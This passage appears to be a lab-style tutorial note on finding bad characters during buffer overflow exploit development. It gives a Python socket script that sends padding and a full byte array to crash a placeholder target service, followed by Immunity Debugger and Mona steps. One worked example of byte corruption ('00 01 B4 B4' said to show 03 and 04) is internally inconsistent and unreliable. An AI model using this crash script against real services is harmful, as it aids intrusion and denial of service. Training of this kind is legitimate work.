To find bad characters we gotta send a bunch of different bytes characters, to do that with python we do 

```python
import socket
from time import sleep

ip, port = "10.10.10.10", 9999 # Change the ip and port
offset = 0  # change this with what you got from step 2
prefix = b"" # change this if necessary and make sure theres a space at the end.
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

try:
	s = socket.socket()
	s.connect((ip, port))
	s.send(prefix + b"A"*offset + b"B"*4 + badchars)
except:
	print(f"Something went wrong")

s.close()
```

After executing it and crashing the program, right click the ESP in the top right with Immunity debugger and press "Follow in dump" that should take you somewhere in the bottom left and you see the characters are in order like 01 02 03 04 etc. and the pattern should be similar to the bad chars list above if something is out of order like 01 02 03 04 05 B0, that B0 is very out of place cuz there should be 06 instead, that means 06 is a bad characters cause it wont show there. Add that to a note somewhere and continue doing that until FF

## Mona automation
This process can be automated with [[Mona]], you have to type these command at the bottom of Immunity debugger

```
!mona config -set workingfolder c:\mona
!mona bytearray -cpb "\x00"
!mona compare -f c:\mona\bytearray.bin -a <ESP>
```

That will compare the bytearray.bin with all the bytes we generated.

# Note
1. \x00 is always a bad characters so always remeber to include that
2. Bad characters can infect the next byte so like 00 01 B4 B4, in that example 03 and 04 are bad characters but in reality only 03 is a bad character, it just infected the one in front of it, so we are not gonna include 04 and only 03.
